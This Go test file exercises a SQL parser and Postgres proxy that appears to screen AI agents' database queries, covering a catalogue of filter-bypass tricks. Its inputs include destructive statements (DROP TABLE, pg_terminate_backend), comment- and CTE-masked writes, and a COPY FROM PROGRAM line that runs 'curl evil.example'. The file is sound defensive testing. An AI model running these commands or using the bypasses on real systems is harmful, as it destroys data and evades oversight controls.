package endpoints

import (
	"bytes"
	"context"
	"io"
	"net"
	"testing"
	"time"

	"github.com/google/go-cmp/cmp"

	"github.com/denoland/clawpatrol/config"
	"github.com/denoland/clawpatrol/config/runtime"
)

// TestParseSQL exercises the tokenizer-based extractor that feeds
// the SQL matcher. Coverage spans v14 happy-path use cases (banned
// verbs, secret-table reads, banned function calls) AND the bypass
// catalogue from clawpatrol#143 the legacy regex extractor missed.
func TestParseSQL(t *testing.T) {
	cases := []struct {
		name string
		sql  string
		want pgInfo
	}{
		{
			"simple select",
			"SELECT id FROM users",
			pgInfo{
				Verb:      "select",
				Verbs:     []string{"select"},
				Tables:    []string{"users"},
				Functions: nil,
				Statement: "SELECT id FROM users",
			},
		},
		{
			"select with multiple tables (join)",
			"SELECT u.id FROM users u JOIN tokens t ON t.user_id = u.id",
			pgInfo{
				Verb:      "select",
				Verbs:     []string{"select"},
				Tables:    []string{"users", "tokens"},
				Functions: nil,
				Statement: "SELECT u.id FROM users u JOIN tokens t ON t.user_id = u.id",
			},
		},
		{
			// Function extraction is intentionally overgreedy: it
			// flags every `<ident>(` callsite, including the
			// table-name + parens (audit (...)) and SQL keywords
			// like values(. The matcher consumes a list — banned-
			// function rules query specific targets — so noise is
			// harmless. Critically, the new tokenizer skips
			// string/comment content, so identifiers buried in
			// literals cannot leak into the function list.
			"insert with function",
			"INSERT INTO audit (ts, what) VALUES (now(), 'x')",
			pgInfo{
				Verb:      "insert",
				Verbs:     []string{"insert"},
				Tables:    []string{"audit"},
				Functions: []string{"audit", "values", "now"},
				Statement: "INSERT INTO audit (ts, what) VALUES (now(), 'x')",
			},
		},
		{
			"banned function (pg_terminate_backend)",
			"SELECT pg_terminate_backend(123)",
			pgInfo{
				Verb:      "select",
				Verbs:     []string{"select"},
				Tables:    nil,
				Functions: []string{"pg_terminate_backend"},
				Statement: "SELECT pg_terminate_backend(123)",
			},
		},
		{
			// COPY foo FROM PROGRAM 'curl ...'. The new walker
			// records `foo` (real target) and `program` (PROGRAM is
			// a clause keyword, but our walker is conservative — it
			// keeps the trailing slot in the FROM list as a table
			// rather than risk dropping a real source). Operators
			// rely on the `statement` glob `"*COPY*FROM PROGRAM*"`
			// to catch this construct regardless.
			"COPY ... FROM PROGRAM",
			"COPY foo FROM PROGRAM 'curl evil.example'",
			pgInfo{
				Verb:      "copy",
				Verbs:     []string{"copy"},
				Tables:    []string{"foo", "program"},
				Functions: nil,
				Statement: "COPY foo FROM PROGRAM 'curl evil.example'",
			},
		},
		{
			"empty sql returns empty info",
			"",
			pgInfo{},
		},
		{
			"multi-statement keeps raw statement and first verb",
			"SELECT * FROM users; DELETE FROM sessions",
			pgInfo{
				Verb:      "select",
				Verbs:     []string{"select", "delete"},
				Tables:    []string{"users", "sessions"},
				Functions: nil,
				Statement: "SELECT * FROM users; DELETE FROM sessions",
			},
		},
		{
			"schema-qualified table",
			"SELECT * FROM audit.secret_tokens",
			pgInfo{
				Verb:      "select",
				Verbs:     []string{"select"},
				Tables:    []string{"audit.secret_tokens"},
				Functions: nil,
				Statement: "SELECT * FROM audit.secret_tokens",
			},
		},
		{
			"quoted identifier picks up the literal name lowercased",
			"SELECT * FROM \"Sensitive Table\"",
			pgInfo{
				Verb:      "select",
				Verbs:     []string{"select"},
				Tables:    []string{"sensitive table"},
				Functions: nil,
				Statement: "SELECT * FROM \"Sensitive Table\"",
			},
		},

		// ── #143 bypass-catalogue regression tests ──

		{
			// HIGH-severity bypass: multi-statement DROP hidden
			// after a leading SELECT. Pre-#143 the verb was
			// "select" with no record of the DROP at all (regex
			// didn't extract `users` because there's no FROM
			// before it in the DROP TABLE form, and only the first
			// verb was reported). Now `sql.verbs` exposes the
			// hidden write so `"drop" in sql.verbs` blocks it.
			"multi-statement drop after select",
			"SELECT 1; DROP TABLE users",
			pgInfo{
				Verb:      "select",
				Verbs:     []string{"select", "drop"},
				Tables:    []string{"users"},
				Functions: nil,
				Statement: "SELECT 1; DROP TABLE users",
			},
		},
		{
			// HIGH-severity bypass: CTE-wrapped DELETE. Pre-#143
			// the verb was "with" and the only table extracted was
			// `x`, completely masking the DELETE on `secrets`. New
			// behaviour: outer verb is the unwrapped SELECT, but
			// "delete" appears in sql.verbs and "secrets" appears
			// in sql.tables (with the CTE binding `x` filtered).
			// `as` shows up in functions because the extractor is
			// overgreedy — see the insert-with-function note above.
			"CTE wrapping a delete",
			"WITH x AS (DELETE FROM secrets RETURNING *) SELECT * FROM x",
			pgInfo{
				Verb:      "select",
				Verbs:     []string{"select", "delete"},
				Tables:    []string{"secrets"},
				Functions: []string{"as"},
				Statement: "WITH x AS (DELETE FROM secrets RETURNING *) SELECT * FROM x",
			},
		},
		{
			"WITH RECURSIVE plus inner CTE write",
			"WITH RECURSIVE r AS (INSERT INTO audit VALUES (1) RETURNING id) SELECT * FROM r",
			pgInfo{
				Verb:      "select",
				Verbs:     []string{"select", "insert"},
				Tables:    []string{"audit"},
				Functions: []string{"as", "values"},
				Statement: "WITH RECURSIVE r AS (INSERT INTO audit VALUES (1) RETURNING id) SELECT * FROM r",
			},
		},
		{
			// DROP TABLE pre-#143 didn't extract `users`: the regex
			// only fired on FROM/UPDATE/INTO/JOIN. The new walker
			// understands `TABLE` as a table introducer after
			// DROP/TRUNCATE/ALTER/CREATE.
			"drop table extracts the table",
			"DROP TABLE users",
			pgInfo{
				Verb:      "drop",
				Verbs:     []string{"drop"},
				Tables:    []string{"users"},
				Functions: nil,
				Statement: "DROP TABLE users",
			},
		},
		{
			"truncate table extracts the table",
			"TRUNCATE TABLE sessions",
			pgInfo{
				Verb:      "truncate",
				Verbs:     []string{"truncate"},
				Tables:    []string{"sessions"},
				Functions: nil,
				Statement: "TRUNCATE TABLE sessions",
			},
		},
		{
			// Case mixed in keywords AND identifier — verb stays
			// lowercased and identifier text lowercased on
			// extraction.
			"case-mangled verb and keyword",
			"sElEcT * fRoM Users",
			pgInfo{
				Verb:      "select",
				Verbs:     []string{"select"},
				Tables:    []string{"users"},
				Functions: nil,
				Statement: "sElEcT * fRoM Users",
			},
		},
		{
			// Leading comment masked the verb pre-#143: the verb
			// extractor took the first whitespace-delimited token,
			// which was `/*` or `--`. The new lexer drops comments.
			"leading block comment doesn't hide the verb",
			"/* sneaky */ DROP TABLE users",
			pgInfo{
				Verb:      "drop",
				Verbs:     []string{"drop"},
				Tables:    []string{"users"},
				Functions: nil,
				Statement: "/* sneaky */ DROP TABLE users",
			},
		},
		{
			"leading line comment doesn't hide the verb",
			"-- sneaky\nDROP TABLE users",
			pgInfo{
				Verb:      "drop",
				Verbs:     []string{"drop"},
				Tables:    []string{"users"},
				Functions: nil,
				Statement: "-- sneaky\nDROP TABLE users",
			},
		},
		{
			// String literals are opaque. Pre-#143 the regex
			// matched `FROM secrets` inside the literal and
			// reported `secrets` as a table — a false positive.
			"FROM inside a string literal is not a table",
			"SELECT 'FROM secrets'",
			pgInfo{
				Verb:      "select",
				Verbs:     []string{"select"},
				Tables:    nil,
				Functions: nil,
				Statement: "SELECT 'FROM secrets'",
			},
		},
		{
			// E-string with embedded backslash escape — same
			// false-positive avoidance.
			"FROM inside an E-string is not a table",
			"SELECT E'\\nFROM secrets'",
			pgInfo{
				Verb:      "select",
				Verbs:     []string{"select"},
				Tables:    nil,
				Functions: nil,
				Statement: "SELECT E'\\nFROM secrets'",
			},
		},
		{
			// Dollar-quoted body is opaque to extraction. The
			// outer verb is `do` so `sql.verb == 'do'` still
			// blocks PL/pgSQL execution at the rule level.
			"dollar-quoted DO block extracts verb only",
			"DO $$ BEGIN PERFORM pg_terminate_backend(1); END $$",
			pgInfo{
				Verb:      "do",
				Verbs:     []string{"do"},
				Tables:    nil,
				Functions: nil,
				Statement: "DO $$ BEGIN PERFORM pg_terminate_backend(1); END $$",
			},
		},
		{
			// Tagged dollar-quote with semicolons inside — must
			// not be split as separate statements.
			"tagged dollar-quote does not split statements",
			"SELECT $tag$ a; b; c $tag$ AS payload",
			pgInfo{
				Verb:      "select",
				Verbs:     []string{"select"},
				Tables:    nil,
				Functions: nil,
				Statement: "SELECT $tag$ a; b; c $tag$ AS payload",
			},
		},
		{
			// Function name hidden behind a comment between ident
			// and `(`. The lexer drops the comment so the function
			// is detected.
			"comment between function name and paren still detected",
			"SELECT pg_terminate_backend/* hi */(1)",
			pgInfo{
				Verb:      "select",
				Verbs:     []string{"select"},
				Tables:    nil,
				Functions: []string{"pg_terminate_backend"},
				Statement: "SELECT pg_terminate_backend/* hi */(1)",
			},
		},
		{
			// Comma-join: pre-#143 only `a` was extracted because
			// the regex anchored on JOIN/FROM/etc.
			"comma-join extracts every table",
			"SELECT * FROM a, b, c",
			pgInfo{
				Verb:      "select",
				Verbs:     []string{"select"},
				Tables:    []string{"a", "b", "c"},
				Functions: nil,
				Statement: "SELECT * FROM a, b, c",
			},
		},
		{
			// LATERAL: with a subquery on the right, the inner
			// FROM still surfaces. `lateral` is overgreedily
			// captured by the function extractor (ident followed
			// by `(`); rule writers don't deny on it.
			"LATERAL subquery exposes inner table",
			"SELECT * FROM a, LATERAL (SELECT * FROM b WHERE b.id = a.id) sub",
			pgInfo{
				Verb:      "select",
				Verbs:     []string{"select"},
				Tables:    []string{"a", "b"},
				Functions: []string{"lateral"},
				Statement: "SELECT * FROM a, LATERAL (SELECT * FROM b WHERE b.id = a.id) sub",
			},
		},
		{
			"CROSS JOIN modifier handled",
			"SELECT * FROM a CROSS JOIN b",
			pgInfo{
				Verb:      "select",
				Verbs:     []string{"select"},
				Tables:    []string{"a", "b"},
				Functions: nil,
				Statement: "SELECT * FROM a CROSS JOIN b",
			},
		},
		{
			"NATURAL JOIN modifier handled",
			"SELECT * FROM a NATURAL JOIN b",
			pgInfo{
				Verb:      "select",
				Verbs:     []string{"select"},
				Tables:    []string{"a", "b"},
				Functions: nil,
				Statement: "SELECT * FROM a NATURAL JOIN b",
			},
		},
		{
			"LEFT OUTER JOIN with alias",
			"SELECT * FROM a LEFT OUTER JOIN b AS bb ON bb.id = a.id",
			pgInfo{
				Verb:      "select",
				Verbs:     []string{"select"},
				Tables:    []string{"a", "b"},
				Functions: nil,
				Statement: "SELECT * FROM a LEFT OUTER JOIN b AS bb ON bb.id = a.id",
			},
		},
		{
			// UNION ALL with second SELECT containing a write-like
			// keyword would not have been visible to a single-verb
			// matcher.
			"UNION ALL preserves both selects",
			"SELECT * FROM a UNION ALL SELECT * FROM b",
			pgInfo{
				Verb:      "select",
				Verbs:     []string{"select"},
				Tables:    []string{"a", "b"},
				Functions: nil,
				Statement: "SELECT * FROM a UNION ALL SELECT * FROM b",
			},
		},
		{
			// CTE WITH that shadows a real table — the shadow
			// `users` is filtered from the table list because
			// it's a CTE binding. The real read inside the CTE
			// body (`audit.users`) IS surfaced.
			"CTE name shadowing a real table is filtered out",
			"WITH users AS (SELECT * FROM audit.users) SELECT * FROM users",
			pgInfo{
				Verb:      "select",
				Verbs:     []string{"select"},
				Tables:    []string{"audit.users"},
				Functions: []string{"as"},
				Statement: "WITH users AS (SELECT * FROM audit.users) SELECT * FROM users",
			},
		},
		{
			"semicolons inside parens are not statement boundaries",
			"SELECT (SELECT 1) FROM users",
			pgInfo{
				Verb:      "select",
				Verbs:     []string{"select"},
				Tables:    []string{"users"},
				Functions: []string{"select"},
				Statement: "SELECT (SELECT 1) FROM users",
			},
		},
		{
			"LISTEN channel",
			"LISTEN heartbeats",
			pgInfo{
				Verb:      "listen",
				Verbs:     []string{"listen"},
				Tables:    nil,
				Functions: nil,
				Statement: "LISTEN heartbeats",
			},
		},
		{
			"ALTER TABLE",
			"ALTER TABLE users ADD COLUMN x int",
			pgInfo{
				Verb:      "alter",
				Verbs:     []string{"alter"},
				Tables:    []string{"users"},
				Functions: nil,
				Statement: "ALTER TABLE users ADD COLUMN x int",
			},
		},
		{
			"CREATE TABLE",
			"CREATE TABLE x (id int)",
			pgInfo{
				Verb:   "create",
				Verbs:  []string{"create"},
				Tables: []string{"x"},
				// `x` shows up as a function too because the
				// column-definition `(` follows the table name —
				// same overgreed shape as INSERT INTO audit (...).
				Functions: []string{"x"},
				Statement: "CREATE TABLE x (id int)",
			},
		},
		{
			// Block comment inside a FROM clause shouldn't split
			// or hide the table.
			"block comment inside FROM clause",
			"SELECT * /* comment */ FROM /* more */ users /* trailing */ WHERE id = 1",
			pgInfo{
				Verb:      "select",
				Verbs:     []string{"select"},
				Tables:    []string{"users"},
				Functions: nil,
				Statement: "SELECT * /* comment */ FROM /* more */ users /* trailing */ WHERE id = 1",
			},
		},
		{
			// Nested block comments per the postgres extension.
			"nested block comment",
			"/* outer /* inner */ still inside */ SELECT * FROM users",
			pgInfo{
				Verb:      "select",
				Verbs:     []string{"select"},
				Tables:    []string{"users"},
				Functions: nil,
				Statement: "/* outer /* inner */ still inside */ SELECT * FROM users",
			},
		},
		{
			// Multi-statement WITH-wrapped writes from BOTH halves.
			"multi-statement with CTE-wrapped writes",
			"WITH a AS (DELETE FROM s RETURNING *) SELECT * FROM a; WITH b AS (UPDATE t SET x=1) INSERT INTO log SELECT * FROM b",
			pgInfo{
				Verb:      "select",
				Verbs:     []string{"select", "delete", "insert", "update"},
				Tables:    []string{"s", "t", "log"},
				Functions: []string{"as"},
				Statement: "WITH a AS (DELETE FROM s RETURNING *) SELECT * FROM a; WITH b AS (UPDATE t SET x=1) INSERT INTO log SELECT * FROM b",
			},
		},
	}
	for _, tc := range cases {
		t.Run(tc.name, func(t *testing.T) {
			got := parseSQL(tc.sql)
			if diff := cmp.Diff(tc.want, got); diff != "" {
				t.Errorf("parseSQL mismatch (-want +got):\n%s", diff)
			}
		})
	}
}

// TestPgMessageFraming round-trips a Q message through readPgMessage
// + serializePgMessage to confirm the wire-protocol framing matches
// what the upstream postgres expects.
func TestPgMessageFraming(t *testing.T) {
	original := pgMessage{typ: 'Q', payload: []byte("SELECT 1\x00")}
	wire := serializePgMessage(original)

	parsed, rest, ok := readPgMessage(wire)
	if !ok {
		t.Fatalf("readPgMessage returned ok=false on round-trip")
	}
	if len(rest) != 0 {
		t.Errorf("expected empty rest, got %d bytes", len(rest))
	}
	if parsed.typ != original.typ {
		t.Errorf("typ=%c want %c", parsed.typ, original.typ)
	}
	if string(parsed.payload) != string(original.payload) {
		t.Errorf("payload=%q want %q", parsed.payload, original.payload)
	}
}

func TestPgMessageFramingRejectsIncompleteOrMalformedPackets(t *testing.T) {
	cases := []struct {
		name string
		wire []byte
	}{
		{name: "partial header", wire: []byte{'Q', 0, 0}},
		{name: "invalid length below minimum", wire: []byte{'Q', 0, 0, 0, 3}},
		{name: "declared payload not fully buffered", wire: []byte{'Q', 0, 0, 0, 9, 'S', 'E'}},
	}
	for _, tc := range cases {
		t.Run(tc.name, func(t *testing.T) {
			_, rest, ok := readPgMessage(tc.wire)
			if ok {
				t.Fatalf("readPgMessage(%v) returned ok=true", tc.wire)
			}
			if string(rest) != string(tc.wire) {
				t.Fatalf("readPgMessage should preserve buffered bytes; got %v want %v", rest, tc.wire)
			}
		})
	}
}

// TestPgExtractSQL confirms the SQL pulled out of Q (terminated
// string) and P (stmt-name \0 query \0) matches the legacy extractor.
func TestPgExtractSQL(t *testing.T) {
	if got := pgExtractSQL('Q', []byte("SELECT 1\x00")); got != "SELECT 1" {
		t.Errorf("Q extract: %q", got)
	}
	if got := pgExtractSQL('P', []byte("stmt1\x00SELECT $1\x00\x00\x00")); got != "SELECT $1" {
		t.Errorf("P extract: %q", got)
	}
	if got := pgExtractSQL('B', []byte("ignored")); got != "" {
		t.Errorf("non-Q/P extract should return empty, got %q", got)
	}
}

func TestPgClientToServerForwardsQueryMessage(t *testing.T) {
	agent, gateway, upstream, upstreamPeer, cleanup := pgPumpTestPipes(t)
	defer cleanup()

	ctx, cancel := context.WithCancel(context.Background())
	defer cancel()
	go pgClientToServer(ctx, &runtime.ConnHandle{Conn: gateway}, upstream, "")

	wire := serializePgMessage(pgMessage{typ: 'Q', payload: []byte("SELECT 1\x00")})
	go func() { _, _ = agent.Write(wire) }()

	got := readFullWithDeadline(t, upstreamPeer, len(wire))
	if !bytes.Equal(got, wire) {
		t.Fatalf("forwarded bytes = %v, want %v", got, wire)
	}
}

func TestPgClientToServerDeniesQueryMessage(t *testing.T) {
	agent, gateway, upstream, upstreamPeer, cleanup := pgPumpTestPipes(t)
	defer cleanup()

	ctx, cancel := context.WithCancel(context.Background())
	defer cancel()
	ch := &runtime.ConnHandle{
		Conn: gateway,
		Endpoint: &config.CompiledEndpoint{Rules: []*config.CompiledRule{{
			Outcome: config.Outcome{Verdict: "deny", Reason: "blocked"},
		}}},
	}
	go pgClientToServer(ctx, ch, upstream, "")

	wire := serializePgMessage(pgMessage{typ: 'Q', payload: []byte("DROP TABLE users\x00")})
	go func() { _, _ = agent.Write(wire) }()
	_ = readFullWithDeadline(t, agent, 5) // ErrorResponse header; unblocks pgWriteDeny.

	_ = upstreamPeer.SetReadDeadline(time.Now().Add(50 * time.Millisecond))
	buf := make([]byte, 1)
	if n, err := upstreamPeer.Read(buf); err == nil || n != 0 {
		t.Fatalf("upstream received denied query bytes: n=%d err=%v", n, err)
	}
}

func TestPgClientToServerForwardsNonInspectedMessage(t *testing.T) {
	agent, gateway, upstream, upstreamPeer, cleanup := pgPumpTestPipes(t)
	defer cleanup()

	ctx, cancel := context.WithCancel(context.Background())
	defer cancel()
	go pgClientToServer(ctx, &runtime.ConnHandle{Conn: gateway}, upstream, "")

	wire := serializePgMessage(pgMessage{typ: 'B', payload: []byte("portal\x00stmt\x00\x00\x00")})
	go func() { _, _ = agent.Write(wire) }()

	got := readFullWithDeadline(t, upstreamPeer, len(wire))
	if !bytes.Equal(got, wire) {
		t.Fatalf("forwarded bytes = %v, want %v", got, wire)
	}
}

func TestPgClientToServerForwardsPartialFrame(t *testing.T) {
	agent, gateway, upstream, upstreamPeer, cleanup := pgPumpTestPipes(t)
	defer cleanup()

	ctx, cancel := context.WithCancel(context.Background())
	defer cancel()
	go pgClientToServer(ctx, &runtime.ConnHandle{Conn: gateway}, upstream, "")

	wire := serializePgMessage(pgMessage{typ: 'Q', payload: []byte("SELECT 1\x00")})
	go func() {
		_, _ = agent.Write(wire[:3])
		time.Sleep(10 * time.Millisecond)
		_, _ = agent.Write(wire[3:])
	}()

	got := readFullWithDeadline(t, upstreamPeer, len(wire))
	if !bytes.Equal(got, wire) {
		t.Fatalf("forwarded bytes = %v, want %v", got, wire)
	}
}

func TestPgClientToServerForwardsMultipleFramesFromOneRead(t *testing.T) {
	agent, gateway, upstream, upstreamPeer, cleanup := pgPumpTestPipes(t)
	defer cleanup()

	ctx, cancel := context.WithCancel(context.Background())
	defer cancel()
	go pgClientToServer(ctx, &runtime.ConnHandle{Conn: gateway}, upstream, "")

	q := serializePgMessage(pgMessage{typ: 'Q', payload: []byte("SELECT 1\x00")})
	syncMsg := serializePgMessage(pgMessage{typ: 'S'})
	wire := append(append([]byte{}, q...), syncMsg...)
	go func() { _, _ = agent.Write(wire) }()

	got := readFullWithDeadline(t, upstreamPeer, len(wire))
	if !bytes.Equal(got, wire) {
		t.Fatalf("forwarded bytes = %v, want %v", got, wire)
	}
}

func pgPumpTestPipes(t *testing.T) (agent, gateway, upstream, upstreamPeer net.Conn, cleanup func()) {
	t.Helper()
	agent, gateway = net.Pipe()
	upstream, upstreamPeer = net.Pipe()
	cleanup = func() {
		_ = agent.Close()
		_ = gateway.Close()
		_ = upstream.Close()
		_ = upstreamPeer.Close()
	}
	return agent, gateway, upstream, upstreamPeer, cleanup
}

func readFullWithDeadline(t *testing.T, c net.Conn, n int) []byte {
	t.Helper()
	_ = c.SetReadDeadline(time.Now().Add(time.Second))
	buf := make([]byte, n)
	if _, err := io.ReadFull(c, buf); err != nil {
		t.Fatalf("read %d bytes: %v", n, err)
	}
	return buf
}

func TestPgClientToServerReturnsOnContextCancel(t *testing.T) {
	agent, gateway := net.Pipe()
	defer func() { _ = agent.Close() }()
	upstream, upstreamPeer := net.Pipe()
	defer func() { _ = upstream.Close() }()
	defer func() { _ = upstreamPeer.Close() }()

	ctx, cancel := context.WithCancel(context.Background())
	done := make(chan struct{})
	go func() {
		defer close(done)
		pgClientToServer(ctx, &runtime.ConnHandle{Conn: gateway}, upstream, "")
	}()

	cancel()
	select {
	case <-done:
	case <-time.After(time.Second):
		t.Fatal("pgClientToServer did not return after context cancellation")
	}
}

// TestPgEvaluateEmitsAllowOnNoMatch nails down the dashboard logging
// fix: an endpoint with zero rules (or one whose rules don't match
// the current query) still emits an `allow` event so the query
// shows up in the actions tab. Without this, postgres connections
// to permissive endpoints were invisible to operators — the runtime
// previously short-circuited on `cr == nil`.
func TestPgEvaluateEmitsAllowOnNoMatch(t *testing.T) {
	var events []runtime.ConnEvent
	ch := &runtime.ConnHandle{
		Endpoint: &config.CompiledEndpoint{
			Name:   "pg-test",
			Family: "sql",
			// Rules is nil — no rule will fire.
		},
		Emit: func(ev runtime.ConnEvent) { events = append(events, ev) },
	}
	if v, _ := pgEvaluate(ch, "SELECT 1", ""); v != "" {
		t.Errorf("verdict %q, want empty (allow)", v)
	}
	if len(events) != 1 {
		t.Fatalf("got %d events, want 1: %+v", len(events), events)
	}
	if events[0].Action != "allow" {
		t.Errorf("Action = %q, want allow", events[0].Action)
	}
	if events[0].Verb != "select" {
		t.Errorf("Verb = %q, want select", events[0].Verb)
	}
}
